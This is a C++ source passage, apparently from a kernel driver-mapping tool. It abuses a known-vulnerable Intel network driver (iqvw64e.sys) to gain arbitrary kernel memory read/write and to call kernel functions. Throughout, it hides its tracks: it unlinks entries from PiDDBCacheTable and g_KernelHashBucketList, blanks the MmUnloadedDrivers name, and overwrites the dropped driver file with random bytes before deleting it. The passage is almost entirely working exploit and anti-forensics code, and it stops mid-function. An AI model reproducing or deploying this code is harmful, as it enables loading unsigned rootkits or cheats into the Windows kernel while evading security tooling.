   std::wstring driver_path = GetDriverPath();
   if (driver_path.empty()) {
      Log(L"[-] Can't find TEMP folder" << std::endl);
      return INVALID_HANDLE_VALUE;
   }

   _wremove(driver_path.c_str());

   if (!utils::CreateFileFromMemory(driver_path,
                                    reinterpret_cast<const char *>(intel_driver_resource::driver),
                                    sizeof(intel_driver_resource::driver))) {
      Log(L"[-] Failed to create vulnerable driver file" << std::endl);
      return INVALID_HANDLE_VALUE;
   }

   if (!service::RegisterAndStart(driver_path)) {
      Log(L"[-] Failed to register and start service for the vulnerable driver" << std::endl);
      _wremove(driver_path.c_str());
      return INVALID_HANDLE_VALUE;
   }

   HANDLE result = CreateFileW(L"\\\\.\\Nal",
                               GENERIC_READ | GENERIC_WRITE,
                               0,
                               nullptr,
                               OPEN_EXISTING,
                               FILE_ATTRIBUTE_NORMAL,
                               NULL);

   if (!result || result == INVALID_HANDLE_VALUE) {
      Log(L"[-] Failed to load driver iqvw64e.sys" << std::endl);
      intel_driver::Unload(result);
      return INVALID_HANDLE_VALUE;
   }

   ntoskrnlAddr = utils::GetKernelModuleAddress("ntoskrnl.exe");
   if (ntoskrnlAddr == 0) {
      Log(L"[-] Failed to get ntoskrnl.exe" << std::endl);
      intel_driver::Unload(result);
      return INVALID_HANDLE_VALUE;
   }

   if (!intel_driver::ClearPiDDBCacheTable(result)) {
      Log(L"[-] Failed to ClearPiDDBCacheTable" << std::endl);
      intel_driver::Unload(result);
      return INVALID_HANDLE_VALUE;
   }

   if (!intel_driver::ClearKernelHashBucketList(result)) {
      Log(L"[-] Failed to ClearKernelHashBucketList" << std::endl);
      intel_driver::Unload(result);
      return INVALID_HANDLE_VALUE;
   }

   if (!intel_driver::ClearMmUnloadedDrivers(result)) {
      Log(L"[!] Failed to ClearMmUnloadedDrivers" << std::endl);
      intel_driver::Unload(result);
      return INVALID_HANDLE_VALUE;
   }

   return result;
}

bool intel_driver::Unload(HANDLE device_handle)
{
   Log(L"[<] Unloading vulnerable driver" << std::endl);

   if (device_handle && device_handle != INVALID_HANDLE_VALUE) {
      CloseHandle(device_handle);
   }

   if (!service::StopAndRemove(GetDriverNameW()))
      return false;

   std::wstring driver_path = GetDriverPath();


   std::ofstream file_ofstream(driver_path.c_str(), std::ios_base::out | std::ios_base::binary);
   int           newFileLen = sizeof(intel_driver_resource::driver) + ((long long)rand() % 2348767 + 56725);
   BYTE         *randomData = new BYTE[newFileLen];
   for (size_t i = 0; i < newFileLen; i++) {
      randomData[i] = (BYTE)(rand() % 255);
   }
   if (!file_ofstream.write((char *)randomData, newFileLen)) {
      Log(L"[!] Error dumping shit inside the disk" << std::endl);
   }
   else {
      Log(L"[+] Vul driver data destroyed before unlink" << std::endl);
   }
   file_ofstream.close();
   delete[] randomData;


   if (_wremove(driver_path.c_str()) != 0)
      return false;

   return true;
}

bool intel_driver::MemCopy(HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size)
{
   if (!destination || !source || !size)
      return 0;

   COPY_MEMORY_BUFFER_INFO copy_memory_buffer = {0};

   copy_memory_buffer.case_number = 0x33;
   copy_memory_buffer.source      = source;
   copy_memory_buffer.destination = destination;
   copy_memory_buffer.length      = size;

   DWORD bytes_returned = 0;
   return DeviceIoControl(device_handle,
                          ioctl1,
                          &copy_memory_buffer,
                          sizeof(copy_memory_buffer),
                          nullptr,
                          0,
                          &bytes_returned,
                          nullptr);
}

bool intel_driver::SetMemory(HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size)
{
   if (!address || !size)
      return 0;

   FILL_MEMORY_BUFFER_INFO fill_memory_buffer = {0};

   fill_memory_buffer.case_number = 0x30;
   fill_memory_buffer.destination = address;
   fill_memory_buffer.value       = value;
   fill_memory_buffer.length      = size;

   DWORD bytes_returned = 0;
   return DeviceIoControl(device_handle,
                          ioctl1,
                          &fill_memory_buffer,
                          sizeof(fill_memory_buffer),
                          nullptr,
                          0,
                          &bytes_returned,
                          nullptr);
}

bool intel_driver::GetPhysicalAddress(HANDLE device_handle, uint64_t address, uint64_t *out_physical_address)
{
   if (!address)
      return 0;

   GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = {0};

   get_phys_address_buffer.case_number          = 0x25;
   get_phys_address_buffer.address_to_translate = address;

   DWORD bytes_returned = 0;

   if (!DeviceIoControl(device_handle,
                        ioctl1,
                        &get_phys_address_buffer,
                        sizeof(get_phys_address_buffer),
                        nullptr,
                        0,
                        &bytes_returned,
                        nullptr))
      return false;

   *out_physical_address = get_phys_address_buffer.return_physical_address;
   return true;
}

uint64_t intel_driver::MapIoSpace(HANDLE device_handle, uint64_t physical_address, uint32_t size)
{
   if (!physical_address || !size)
      return 0;

   MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = {0};

   map_io_space_buffer.case_number             = 0x19;
   map_io_space_buffer.physical_address_to_map = physical_address;
   map_io_space_buffer.size                    = size;

   DWORD bytes_returned = 0;

   if (!DeviceIoControl(device_handle,
                        ioctl1,
                        &map_io_space_buffer,
                        sizeof(map_io_space_buffer),
                        nullptr,
                        0,
                        &bytes_returned,
                        nullptr))
      return 0;

   return map_io_space_buffer.return_virtual_address;
}

bool intel_driver::UnmapIoSpace(HANDLE device_handle, uint64_t address, uint32_t size)
{
   if (!address || !size)
      return false;

   UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = {0};

   unmap_io_space_buffer.case_number     = 0x1A;
   unmap_io_space_buffer.virt_address    = address;
   unmap_io_space_buffer.number_of_bytes = size;

   DWORD bytes_returned = 0;

   return DeviceIoControl(device_handle,
                          ioctl1,
                          &unmap_io_space_buffer,
                          sizeof(unmap_io_space_buffer),
                          nullptr,
                          0,
                          &bytes_returned,
                          nullptr);
}

bool intel_driver::ReadMemory(HANDLE device_handle, uint64_t address, void *buffer, uint64_t size)
{
   return MemCopy(device_handle, reinterpret_cast<uint64_t>(buffer), address, size);
}

bool intel_driver::WriteMemory(HANDLE device_handle, uint64_t address, void *buffer, uint64_t size)
{
   return MemCopy(device_handle, address, reinterpret_cast<uint64_t>(buffer), size);
}

bool intel_driver::WriteToReadOnlyMemory(HANDLE device_handle, uint64_t address, void *buffer, uint32_t size)
{
   if (!address || !buffer || !size)
      return false;

   uint64_t physical_address = 0;

   if (!GetPhysicalAddress(device_handle, address, &physical_address)) {
      Log(L"[-] Failed to translate virtual address 0x" << reinterpret_cast<void *>(address) << std::endl);
      return false;
   }

   const uint64_t mapped_physical_memory = MapIoSpace(device_handle, physical_address, size);

   if (!mapped_physical_memory) {
      Log(L"[-] Failed to map IO space of 0x" << reinterpret_cast<void *>(physical_address) << std::endl);
      return false;
   }

   bool result = WriteMemory(device_handle, mapped_physical_memory, buffer, size);

#if defined(DISABLE_OUTPUT)
   UnmapIoSpace(device_handle, mapped_physical_memory, size);
#else
   if (!UnmapIoSpace(device_handle, mapped_physical_memory, size))
      Log(L"[!] Failed to unmap IO space of physical address 0x" << reinterpret_cast<void *>(physical_address)
                                                                 << std::endl);
#endif

   return result;
}


uint64_t intel_driver::MmAllocatePagesForMdl(HANDLE        device_handle,
                                             LARGE_INTEGER LowAddress,
                                             LARGE_INTEGER HighAddress,
                                             LARGE_INTEGER SkipBytes,
                                             SIZE_T        TotalBytes)
{
   static uint64_t kernel_MmAllocatePagesForMdl
      = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmAllocatePagesForMdl");

   if (!kernel_MmAllocatePagesForMdl) {
      Log(L"[!] Failed to find MmAlocatePagesForMdl" << std::endl);
      return 0;
   }

   uint64_t allocated_pages = 0;

   if (!CallKernelFunction(device_handle,
                           &allocated_pages,
                           kernel_MmAllocatePagesForMdl,
                           LowAddress,
                           HighAddress,
                           SkipBytes,
                           TotalBytes))
      return 0;

   return allocated_pages;
}

uint64_t intel_driver::MmMapLockedPagesSpecifyCache(HANDLE                  device_handle,
                                                    uint64_t                pmdl,
                                                    nt::KPROCESSOR_MODE     AccessMode,
                                                    nt::MEMORY_CACHING_TYPE CacheType,
                                                    uint64_t                RequestedAddress,
                                                    ULONG                   BugCheckOnFailure,
                                                    ULONG                   Priority)
{
   static uint64_t kernel_MmMapLockedPagesSpecifyCache
      = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmMapLockedPagesSpecifyCache");

   if (!kernel_MmMapLockedPagesSpecifyCache) {
      Log(L"[!] Failed to find MmMapLockedPagesSpecifyCache" << std::endl);
      return 0;
   }

   uint64_t starting_address = 0;

   if (!CallKernelFunction(device_handle,
                           &starting_address,
                           kernel_MmMapLockedPagesSpecifyCache,
                           pmdl,
                           AccessMode,
                           CacheType,
                           RequestedAddress,
                           BugCheckOnFailure,
                           Priority))
      return 0;

   return starting_address;
}

bool intel_driver::MmProtectMdlSystemAddress(HANDLE device_handle, uint64_t MemoryDescriptorList, ULONG NewProtect)
{
   static uint64_t kernel_MmProtectMdlSystemAddress
      = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmProtectMdlSystemAddress");

   if (!kernel_MmProtectMdlSystemAddress) {
      Log(L"[!] Failed to find MmProtectMdlSystemAddress" << std::endl);
      return 0;
   }

   NTSTATUS status;

   if (!CallKernelFunction(device_handle, &status, kernel_MmProtectMdlSystemAddress, MemoryDescriptorList, NewProtect))
      return 0;

   return NT_SUCCESS(status);
}

bool intel_driver::MmUnmapLockedPages(HANDLE device_handle, uint64_t BaseAddress, uint64_t pmdl)
{
   static uint64_t kernel_MmUnmapLockedPages
      = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmUnmapLockedPages");

   if (!kernel_MmUnmapLockedPages) {
      Log(L"[!] Failed to find MmUnmapLockedPages" << std::endl);
      return 0;
   }

   void *result;
   return CallKernelFunction(device_handle, &result, kernel_MmUnmapLockedPages, BaseAddress, pmdl);
}

bool intel_driver::MmFreePagesFromMdl(HANDLE device_handle, uint64_t MemoryDescriptorList)
{
   static uint64_t kernel_MmFreePagesFromMdl
      = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "MmFreePagesFromMdl");

   if (!kernel_MmFreePagesFromMdl) {
      Log(L"[!] Failed to find MmFreePagesFromMdl" << std::endl);
      return 0;
   }

   void *result;
   return CallKernelFunction(device_handle, &result, kernel_MmFreePagesFromMdl, MemoryDescriptorList);
}


uint64_t intel_driver::AllocatePool(HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size)
{
   if (!size)
      return 0;

   static uint64_t kernel_ExAllocatePool
      = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAllocatePoolWithTag");

   if (!kernel_ExAllocatePool) {
      Log(L"[!] Failed to find ExAllocatePool" << std::endl);
      return 0;
   }

   uint64_t allocated_pool = 0;

   if (!CallKernelFunction(device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'BwtE'))
      return 0;

   return allocated_pool;
}

bool intel_driver::FreePool(HANDLE device_handle, uint64_t address)
{
   if (!address)
      return 0;

   static uint64_t kernel_ExFreePool = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExFreePool");

   if (!kernel_ExFreePool) {
      Log(L"[!] Failed to find ExAllocatePool" << std::endl);
      return 0;
   }

   return CallKernelFunction<void>(device_handle, nullptr, kernel_ExFreePool, address);
}

uint64_t intel_driver::GetKernelModuleExport(HANDLE             device_handle,
                                             uint64_t           kernel_module_base,
                                             const std::string &function_name)
{
   if (!kernel_module_base)
      return 0;

   IMAGE_DOS_HEADER   dos_header = {0};
   IMAGE_NT_HEADERS64 nt_headers = {0};

   if (!ReadMemory(device_handle, kernel_module_base, &dos_header, sizeof(dos_header))
       || dos_header.e_magic != IMAGE_DOS_SIGNATURE
       || !ReadMemory(device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers))
       || nt_headers.Signature != IMAGE_NT_SIGNATURE)
      return 0;

   const auto export_base      = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
   const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

   if (!export_base || !export_base_size)
      return 0;

   const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(
      VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));

   if (!ReadMemory(device_handle, kernel_module_base + export_base, export_data, export_base_size)) {
      VirtualFree(export_data, 0, MEM_RELEASE);
      return 0;
   }

   const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

   const auto name_table     = reinterpret_cast<uint32_t *>(export_data->AddressOfNames + delta);
   const auto ordinal_table  = reinterpret_cast<uint16_t *>(export_data->AddressOfNameOrdinals + delta);
   const auto function_table = reinterpret_cast<uint32_t *>(export_data->AddressOfFunctions + delta);

   for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
      const std::string current_function_name = std::string(reinterpret_cast<char *>(name_table[i] + delta));

      if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
         const auto function_ordinal = ordinal_table[i];
         if (function_table[function_ordinal] <= 0x1000) {

            return 0;
         }
         const auto function_address = kernel_module_base + function_table[function_ordinal];

         if (function_address >= kernel_module_base + export_base
             && function_address <= kernel_module_base + export_base + export_base_size) {
            VirtualFree(export_data, 0, MEM_RELEASE);
            return 0;
         }

         VirtualFree(export_data, 0, MEM_RELEASE);
         return function_address;
      }
   }

   VirtualFree(export_data, 0, MEM_RELEASE);
   return 0;
}

bool intel_driver::ClearMmUnloadedDrivers(HANDLE device_handle)
{
   ULONG buffer_size = 0;
   void *buffer      = nullptr;

   NTSTATUS status
      = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation),
                                 buffer,
                                 buffer_size,
                                 &buffer_size);

   while (status == nt::STATUS_INFO_LENGTH_MISMATCH) {
      VirtualFree(buffer, 0, MEM_RELEASE);

      buffer = VirtualAlloc(nullptr, buffer_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
      status = NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(nt::SystemExtendedHandleInformation),
                                        buffer,
                                        buffer_size,
                                        &buffer_size);
   }

   if (!NT_SUCCESS(status) || buffer == 0) {
      if (buffer != 0)
         VirtualFree(buffer, 0, MEM_RELEASE);
      return false;
   }

   uint64_t object = 0;

   auto system_handle_inforamtion = static_cast<nt::PSYSTEM_HANDLE_INFORMATION_EX>(buffer);

   for (auto i = 0u; i < system_handle_inforamtion->HandleCount; ++i) {
      const nt::SYSTEM_HANDLE current_system_handle = system_handle_inforamtion->Handles[i];

      if (current_system_handle.UniqueProcessId
          != reinterpret_cast<HANDLE>(static_cast<uint64_t>(GetCurrentProcessId())))
         continue;

      if (current_system_handle.HandleValue == device_handle) {
         object = reinterpret_cast<uint64_t>(current_system_handle.Object);
         break;
      }
   }

   VirtualFree(buffer, 0, MEM_RELEASE);

   if (!object)
      return false;

   uint64_t device_object = 0;

   if (!ReadMemory(device_handle, object + 0x8, &device_object, sizeof(device_object)) || !device_object) {
      Log(L"[!] Failed to find device_object" << std::endl);
      return false;
   }

   uint64_t driver_object = 0;

   if (!ReadMemory(device_handle, device_object + 0x8, &driver_object, sizeof(driver_object)) || !driver_object) {
      Log(L"[!] Failed to find driver_object" << std::endl);
      return false;
   }

   uint64_t driver_section = 0;

   if (!ReadMemory(device_handle, driver_object + 0x28, &driver_section, sizeof(driver_section)) || !driver_section) {
      Log(L"[!] Failed to find driver_section" << std::endl);
      return false;
   }

   UNICODE_STRING us_driver_base_dll_name = {0};

   if (!ReadMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))
       || us_driver_base_dll_name.Length == 0) {
      Log(L"[!] Failed to find driver name" << std::endl);
      return false;
   }

   wchar_t *unloadedName = new wchar_t[(ULONG64)us_driver_base_dll_name.Length / 2ULL + 1ULL];
   memset(unloadedName, 0, us_driver_base_dll_name.Length + sizeof(wchar_t));

   if (!ReadMemory(device_handle,
                   (uintptr_t)us_driver_base_dll_name.Buffer,
                   unloadedName,
                   us_driver_base_dll_name.Length)) {
      Log(L"[!] Failed to read driver name" << std::endl);
      return false;
   }

   us_driver_base_dll_name.Length = 0;

   if (!WriteMemory(device_handle, driver_section + 0x58, &us_driver_base_dll_name, sizeof(us_driver_base_dll_name))) {
      Log(L"[!] Failed to write driver name length" << std::endl);
      return false;
   }

   Log(L"[+] MmUnloadedDrivers Cleaned: " << unloadedName << std::endl);

   delete[] unloadedName;

   return true;
}

PVOID intel_driver::ResolveRelativeAddress(HANDLE     device_handle,
                                           _In_ PVOID Instruction,
                                           _In_ ULONG OffsetOffset,
                                           _In_ ULONG InstructionSize)
{
   ULONG_PTR Instr     = (ULONG_PTR)Instruction;
   LONG      RipOffset = 0;
   if (!ReadMemory(device_handle, Instr + OffsetOffset, &RipOffset, sizeof(LONG))) {
      return nullptr;
   }
   PVOID ResolvedAddr = (PVOID)(Instr + InstructionSize + RipOffset);
   return ResolvedAddr;
}

bool intel_driver::ExAcquireResourceExclusiveLite(HANDLE device_handle, PVOID Resource, BOOLEAN wait)
{
   if (!Resource)
      return 0;

   static uint64_t kernel_ExAcquireResourceExclusiveLite
      = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExAcquireResourceExclusiveLite");

   if (!kernel_ExAcquireResourceExclusiveLite) {
      Log(L"[!] Failed to find ExAcquireResourceExclusiveLite" << std::endl);
      return 0;
   }

   BOOLEAN out;

   return (CallKernelFunction(device_handle, &out, kernel_ExAcquireResourceExclusiveLite, Resource, wait) && out);
}

bool intel_driver::ExReleaseResourceLite(HANDLE device_handle, PVOID Resource)
{
   if (!Resource)
      return false;

   static uint64_t kernel_ExReleaseResourceLite
      = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "ExReleaseResourceLite");

   if (!kernel_ExReleaseResourceLite) {
      Log(L"[!] Failed to find ExReleaseResourceLite" << std::endl);
      return false;
   }

   return CallKernelFunction<void>(device_handle, nullptr, kernel_ExReleaseResourceLite, Resource);
}

BOOLEAN intel_driver::RtlDeleteElementGenericTableAvl(HANDLE device_handle, PVOID Table, PVOID Buffer)
{
   if (!Table)
      return false;

   static uint64_t kernel_RtlDeleteElementGenericTableAvl
      = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");

   if (!kernel_RtlDeleteElementGenericTableAvl) {
      Log(L"[!] Failed to find RtlDeleteElementGenericTableAvl" << std::endl);
      return false;
   }

   BOOLEAN out;

   return (CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer) && out);
}

PVOID intel_driver::RtlLookupElementGenericTableAvl(HANDLE device_handle, PRTL_AVL_TABLE Table, PVOID Buffer)
{
   if (!Table)
      return nullptr;

   static uint64_t kernel_RtlDeleteElementGenericTableAvl
      = GetKernelModuleExport(device_handle, intel_driver::ntoskrnlAddr, "RtlLookupElementGenericTableAvl");

   if (!kernel_RtlDeleteElementGenericTableAvl) {
      Log(L"[!] Failed to find RtlLookupElementGenericTableAvl" << std::endl);
      return nullptr;
   }

   PVOID out;

   if (!CallKernelFunction(device_handle, &out, kernel_RtlDeleteElementGenericTableAvl, Table, Buffer))
      return 0;

   return out;
}

intel_driver::PiDDBCacheEntry *intel_driver::LookupEntry(HANDLE         device_handle,
                                                         PRTL_AVL_TABLE PiDDBCacheTable,
                                                         ULONG          timestamp,
                                                         const wchar_t *name)
{

   PiDDBCacheEntry localentry{};
   localentry.TimeDateStamp            = timestamp;
   localentry.DriverName.Buffer        = (PWSTR)name;
   localentry.DriverName.Length        = (USHORT)(wcslen(name) * 2);
   localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;

   return (PiDDBCacheEntry *)RtlLookupElementGenericTableAvl(device_handle, PiDDBCacheTable, (PVOID)&localentry);
}

bool intel_driver::ClearPiDDBCacheTable(HANDLE device_handle)
{

   PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x8B\xD8\x85\xC0\x0F\x88\x00\x00\x00\x00\x65\x48\x8B\x04\x25\x00\x00\x00\x00\x66\xFF\x88\x00\x00\x00\x00\xB2\x01\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x4C\x8B\x00\x24", (char*)"xxxxxx????xxxxx????xxx????xxxxx????x????xx?x");
   PiDDBCacheTablePtr = FindPatternInSectionAtKernel(device_handle,
                                                     (char *)"PAGE",
                                                     intel_driver::ntoskrnlAddr,
                                                     (PUCHAR) "\x66\x03\xD2\x48\x8D\x0D",
                                                     (char *)"xxxxxx");

   if (PiDDBLockPtr == NULL) {
      PiDDBLockPtr = FindPatternInSectionAtKernel(device_handle, (char*)"PAGE", intel_driver::ntoskrnlAddr, (PUCHAR)"\x48\x8B\x0D\x00\x00\x00\x00\x48\x85\xC9\x0F\x85\x00\x00\x00\x00\x48\x8D\x0D\x00\x00\x00\x00\xE8\x00\x00\x00\x00\xE8", (char*)"xxx????xxxxx????xxx????x????x");
      if (PiDDBLockPtr == NULL) {
         Log(L"[-] Warning PiDDBLock not found" << std::endl);
         return false;
      }
      Log(L"[+] PiDDBLock found with second pattern" << std::endl);
      PiDDBLockPtr += 16;
   }
   else {
      PiDDBLockPtr += 28;
   }

   if (PiDDBCacheTablePtr == NULL) {
      Log(L"[-] Warning PiDDBCacheTable not found" << std::endl);
      return false;
   }

   Log("[+] PiDDBLock Ptr 0x" << std::hex << PiDDBLockPtr << std::endl);
   Log("[+] PiDDBCacheTable Ptr 0x" << std::hex << PiDDBCacheTablePtr << std::endl);

   PVOID          PiDDBLock = ResolveRelativeAddress(device_handle, (PVOID)PiDDBLockPtr, 3, 7);
   PRTL_AVL_TABLE PiDDBCacheTable
      = (PRTL_AVL_TABLE)ResolveRelativeAddress(device_handle, (PVOID)PiDDBCacheTablePtr, 6, 10);


   if (!ExAcquireResourceExclusiveLite(device_handle, PiDDBLock, true)) {
      Log(L"[-] Can't lock PiDDBCacheTable" << std::endl);
      return false;
   }
   Log(L"[+] PiDDBLock Locked" << std::endl);

   auto n = GetDriverNameW();


   PiDDBCacheEntry *pFoundEntry
      = (PiDDBCacheEntry *)LookupEntry(device_handle, PiDDBCacheTable, iqvw64e_timestamp, n.c_str());
   if (pFoundEntry == nullptr) {
      Log(L"[-] Not found in cache" << std::endl);
      ExReleaseResourceLite(device_handle, PiDDBLock);
      return false;
   }


   PLIST_ENTRY prev;
   if (!ReadMemory(device_handle,
                   (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Blink)),
                   &prev,
                   sizeof(_LIST_ENTRY *))) {
      Log(L"[-] Can't get prev entry" << std::endl);
      ExReleaseResourceLite(device_handle, PiDDBLock);
      return false;
   }
   PLIST_ENTRY next;
   if (!ReadMemory(device_handle,
                   (uintptr_t)pFoundEntry + (offsetof(struct _PiDDBCacheEntry, List.Flink)),
                   &next,
                   sizeof(_LIST_ENTRY *))) {
      Log(L"[-] Can't get next entry" << std::endl);
      ExReleaseResourceLite(device_handle, PiDDBLock);
      return false;
   }

   Log("[+] Found Table Entry = 0x" << std::hex << pFoundEntry << std::endl);

   if (!WriteMemory(device_handle,
                    (uintptr_t)prev + (offsetof(struct _LIST_ENTRY, Flink)),
                    &next,
                    sizeof(_LIST_ENTRY *))) {
      Log(L"[-] Can't set next entry" << std::endl);
      ExReleaseResourceLite(device_handle, PiDDBLock);
      return false;
   }
   if (!WriteMemory(device_handle,
                    (uintptr_t)next + (offsetof(struct _LIST_ENTRY, Blink)),
                    &prev,
                    sizeof(_LIST_ENTRY *))) {
      Log(L"[-] Can't set prev entry" << std::endl);
      ExReleaseResourceLite(device_handle, PiDDBLock);
      return false;
   }


   if (!RtlDeleteElementGenericTableAvl(device_handle, PiDDBCacheTable, pFoundEntry)) {
      Log(L"[-] Can't delete from PiDDBCacheTable" << std::endl);
      ExReleaseResourceLite(device_handle, PiDDBLock);
      return false;
   }


   ULONG cacheDeleteCount = 0;
   ReadMemory(device_handle,
              (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)),
              &cacheDeleteCount,
              sizeof(ULONG));
   if (cacheDeleteCount > 0) {
      cacheDeleteCount--;
      WriteMemory(device_handle,
                  (uintptr_t)PiDDBCacheTable + (offsetof(struct _RTL_AVL_TABLE, DeleteCount)),
                  &cacheDeleteCount,
                  sizeof(ULONG));
   }


   ExReleaseResourceLite(device_handle, PiDDBLock);

   Log(L"[+] PiDDBCacheTable Cleaned" << std::endl);

   return true;
}

uintptr_t intel_driver::FindPatternAtKernel(HANDLE    device_handle,
                                            uintptr_t dwAddress,
                                            uintptr_t dwLen,
                                            BYTE     *bMask,
                                            char     *szMask)
{
   if (!dwAddress) {
      Log(L"[-] No module address to find pattern" << std::endl);
      return 0;
   }

   if (dwLen > 1024 * 1024 * 1024) {
      Log(L"[-] Can't find pattern, Too big section" << std::endl);
      return 0;
   }

   BYTE *sectionData = new BYTE[dwLen];
   if (!ReadMemory(device_handle, dwAddress, sectionData, dwLen)) {
      Log(L"[-] Read failed in FindPatternAtKernel" << std::endl);
      return 0;
   }

   auto result = utils::FindPattern((uintptr_t)sectionData, dwLen, bMask, szMask);

   if (result <= 0) {
      Log(L"[-] Can't find pattern" << std::endl);
      delete[] sectionData;
      return 0;
   }
   result = dwAddress - (uintptr_t)sectionData + result;
   delete[] sectionData;
   return result;
}

uintptr_t intel_driver::FindSectionAtKernel(HANDLE device_handle, char *sectionName, uintptr_t modulePtr, PULONG size)
{
   if (!modulePtr)
      return 0;
   BYTE headers[0x1000];
   if (!ReadMemory(device_handle, modulePtr, headers, 0x1000)) {
      Log(L"[-] Can't read module headers" << std::endl);
      return 0;
   }
   ULONG     sectionSize = 0;
   uintptr_t section     = (uintptr_t)utils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
   if (!section || !sectionSize) {
      Log(L"[-] Can't find section" << std::endl);
      return 0;
   }
   if (size)
      *size = sectionSize;
   return section - (uintptr_t)headers + modulePtr;
}

uintptr_t intel_driver::FindPatternInSectionAtKernel(HANDLE    device_handle,
                                                     char     *sectionName,
                                                     uintptr_t modulePtr,
                                                     BYTE     *bMask,
                                                     char     *szMask)
{
   ULONG     sectionSize = 0;
   uintptr_t section     = FindSectionAtKernel(device_handle, sectionName, modulePtr, &sectionSize);
   return FindPatternAtKernel(device_handle, section, sectionSize, bMask, szMask);
}

bool intel_driver::ClearKernelHashBucketList(HANDLE device_handle)
{
   uint64_t ci = utils::GetKernelModuleAddress("ci.dll");
   if (!ci) {
      Log(L"[-] Can't Find ci.dll module address" << std::endl);
      return false;
   }


   auto sig = FindPatternInSectionAtKernel(device_handle,
                                           (char *)"PAGE",
                                           ci,
                                           PUCHAR("\x48\x8B\x1D\x00\x00\x00\x00\xEB\x00\xF7\x43\x40\x00\x20\x00\x00"),
                                           (char *)"xxx????x?xxxxxxx");
   if (!sig) {
      Log(L"[-] Can't Find g_KernelHashBucketList" << std::endl);
      return false;
   }
   auto sig2 = FindPatternAtKernel(device_handle, (uintptr_t)sig - 50, 50, PUCHAR("\x48\x8D\x0D"), (char *)"xxx");
   if (!sig2) {
      Log(L"[-] Can't Find g_HashCacheLock" << std::endl);
      return false;
   }
   const auto g_KernelHashBucketList = ResolveRelativeAddress(device_handle, (PVOID)sig, 3, 7);
   const auto g_HashCacheLock        = ResolveRelativeAddress(device_handle, (PVOID)sig2, 3, 7);
   if (!g_KernelHashBucketList || !g_HashCacheLock) {
      Log(L"[-] Can't Find g_HashCache relative address" << std::endl);
      return false;
   }

   Log(L"[+] g_KernelHashBucketList Found 0x" << std::hex << g_KernelHashBucketList << std::endl);

   if (!ExAcquireResourceExclusiveLite(device_handle, g_HashCacheLock, true)) {
      Log(L"[-] Can't lock g_HashCacheLock" << std::endl);
      return false;
   }
   Log(L"[+] g_HashCacheLock Locked" << std::endl);

   HashBucketEntry *prev  = (HashBucketEntry *)g_KernelHashBucketList;
   HashBucketEntry *entry = 0;
   if (!ReadMemory(device_handle, (uintptr_t)prev, &entry, sizeof(entry))) {
      Log(L"[-] Failed to read first g_KernelHashBucketList entry!" << std::endl);
      if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
         Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
      }
      return false;
   }
   if (!entry) {
      Log(L"[!] g_KernelHashBucketList looks empty!" << std::endl);
      if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
         Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
      }
      return true;
   }

   std::wstring wdname       = GetDriverNameW();
   std::wstring search_path  = GetDriverPath();
   SIZE_T       expected_len = (search_path.length() - 2) * 2;

   while (entry) {

      USHORT wsNameLen = 0;
      if (!ReadMemory(device_handle,
                      (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Length),
                      &wsNameLen,
                      sizeof(wsNameLen))
          || wsNameLen == 0) {
         Log(L"[-] Failed to read g_KernelHashBucketList entry text len!" << std::endl);
         if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
            Log(L"[-] Failed to release g_KernelHashBucketList lock!" << std::endl);
         }
         return false;
      }

      if (expected_len == wsNameLen) {
         wchar_t *wsNamePtr = 0;
         if (!ReadMemory(device_handle,
                         (uintptr_t)entry + offsetof(HashBucketEntry, DriverName.Buffer),
                         &wsNamePtr,
                         sizeof(wsNamePtr))
             || !wsNamePtr) {
            Log(L"[-] Failed to read g_KernelHashBucketList entry text ptr!" << std::endl);
            if (!ExReleaseResourceLite(device_handle, g_HashCacheLock)) {
